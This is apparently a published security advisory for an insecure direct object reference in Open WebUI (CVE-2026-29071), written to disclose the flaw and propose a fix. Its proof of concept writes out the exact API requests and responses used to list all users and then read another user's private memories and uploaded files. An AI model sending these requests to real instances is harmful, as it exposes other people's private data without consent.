@@ -1,0 +1,165 @@
+PYSEC-2026-2765 PyPI/open-webui — Open WebUI's Insecure Direct Object Reference (IDOR) allows access to other users' memories
+package: open-webui
+ecosystem: PyPI
+versions affected:
+  >= 0, < 0.8.6 (ECOSYSTEM)
+aliases: CVE-2026-29071, GHSA-w9f8-gxf9-rhvw
+references:
+  https://github.com/open-webui/open-webui/security/advisories/GHSA-w9f8-gxf9-rhvw
+  https://nvd.nist.gov/vuln/detail/CVE-2026-29071
+  https://github.com/open-webui/open-webui
+  https://pypi.org/project/open-webui
+  https://github.com/advisories/GHSA-w9f8-gxf9-rhvw
+
+### Summary
+Any authenticated user can read other users' private memories via `/api/v1/retrieval/query/collection`
+
+### Details
+**Vulnerability 1: Missing authorization in collection querying**
+
+In `backend/open_webui/routers/retrieval.py`, the `query_collection_handler` function accepts a list of `collection_names` but performs no ownership validation:
+
+```python
+async def query_collection_handler(
+    request: Request,
+    form_data: QueryCollectionsForm,
+    user=Depends(get_verified_user),  # Only checks authentication, not authorization
+):
+```
+
+Collection names follow predictable patterns:
+- User files: `file-{FILE_UUID}`
+- User memories: `user-memory-{USER_UUID}` (requires Memory experimental feature)
+
+### PoC
+**Environment:** Open WebUI v0.8.3, default configuration.
+**Setup:**
+1. Register two users: admin (first user) and attacker (second user).
+2. As admin, upload a PDF document through chat.
+3. As admin, enable Memory (Settings → Personalization → Memory) and add some memories.
+
+**Exploitation — Step 1: Enumerate all users**
+
+```
+GET /api/v1/users/search HTTP/1.1
+Host: <target>
+Authorization: Bearer <attacker_token>
+```
+
+Response reveals all users including admin's UUID, email, and role:
+
+```json
+{
+  "users": [
+    {
+      "id": "1e4756eb-b064-4781-8b06-4979bca59c8b",
+      "name": "user",
+      "email": "user@test.com",
+      "role": "user"
+    },
+    {
+      "id": "81d2f94a-3dfb-479c-af98-e29f0f40c4ba",
+      "name": "admin",
+      "email": "admin@test.com",
+      "role": "admin"
+    }
+  ]
+}
+```
+
+<img width="1340" height="731" alt="1poc - users" src="https://github.com/user-attachments/assets/46d1cb64-2f84-480e-b887-819008ddabc9" />
+
+**Exploitation — Step 2: Read admin's memories**
+
+Using the admin UUID obtained in Step 1, query their private memory collection:
+
+```
+POST /api/v1/retrieval/query/collection HTTP/1.1
+Host: <target>
+Authorization: Bearer <attacker_token>
+Content-Type: application/json
+
+{
+  "collection_names": ["user-memory-<admin_UUID_from_step_1>"],
+  "query": "test"
+}
+```
+
+Response returns admin's private memories:
+
+```json
+{
+  "documents": [["User is testing IDOR", "User - Mariusz, security researcher"]]
+}
+```
+
+<img width="1285" height="606" alt="2poc - memory" src="https://github.com/user-attachments/assets/eac7c129-dcad-4afd-9449-2ca93b19e082" />
+
+**Note:** Step 2 requires the Memory experimental feature to be enabled. Steps 1 and 3 work on default configuration.
+
+**Exploitation — Step 3: Read admin's private file (Vulnerability 1)**
+
+File collections use the pattern `file-{FILE_UUID}`. The file UUID must be obtained separately. Once known:
+
+```
+POST /api/v1/retrieval/query/collection HTTP/1.1
+Host: <target>
+Authorization: Bearer <attacker_token>
+Content-Type: application/json
+
+{
+  "collection_names": ["file-<file_UUID>"],
+  "query": "test"
+}
+```
+
+Response returns admin's private document content and full metadata:
+
+```json
+{
+  "documents": [["Test PDF  \nabc   \nbcd"]],
+  "metadatas": [[{
+    "name": "Test PDF.pdf",
+    "author": "Mariusz Maik",
+    "created_by": "81d2f94a-3dfb-479c-af98-e29f0f40c4ba",
+    "file_id": "243bee10-49ad-466f-884b-67b6b3d74968"
+  }]]
+}
+```
+
+<img width="1413" height="908" alt="image" src="https://github.com/user-attachments/assets/43041261-ec98-4f3f-8c26-a0c63ef18596" />
+
+### Impact
+-  **Document theft:** Any authenticated user can read the full content and metadata of files uploaded by any other user, including admins.
+- **User enumeration:** All user UUIDs, emails, names, and roles are exposed to any authenticated user via `/api/v1/users/search`.
+- **Memory leakage:** When the Memory experimental feature is enabled, personal memories stored by users for LLM personalization can be read by any other user — directly contradicting the official documentation.
+- **No admin privileges required:** A regular user account is sufficient to exploit all of the above.
+
+### Suggested Fix
+
+**1. Add ownership validation in `/api/v1/retrieval/query/collection`:**
+
+```python
+async def query_collection_handler(
+    request: Request,
+    form_data: QueryCollectionsForm,
+    user=Depends(get_verified_user),
+):
+    for collection_name in form_data.collection_names:
+        if collection_name.startswith("user-memory-"):
+            owner_id = collection_name.replace("user-memory-", "")
+            if owner_id != user.id and user.role != "admin":
+                raise HTTPException(status_code=403, detail="Access denied")
+        elif collection_name.startswith("file-"):
+            file_id = collection_name.replace("file-", "")
+            # user_has_access_to_file — placeholder; verify file ownership
+            # e.g. check if created_by matches user.id
+            if not user_has_access_to_file(user.id, file_id):
+                raise HTTPException(status_code=403, detail="Access denied")
+```
+
+**2. Restrict `/api/v1/users/search`** to admin-only or limit the fields returned to non-privileged users.
+
+### Disclosure
+
+AI was used to assist with writing this report. The vulnerability was identified and confirmed through hands-on testing on Open WebUI v0.8.3. All screenshots are from real testing.
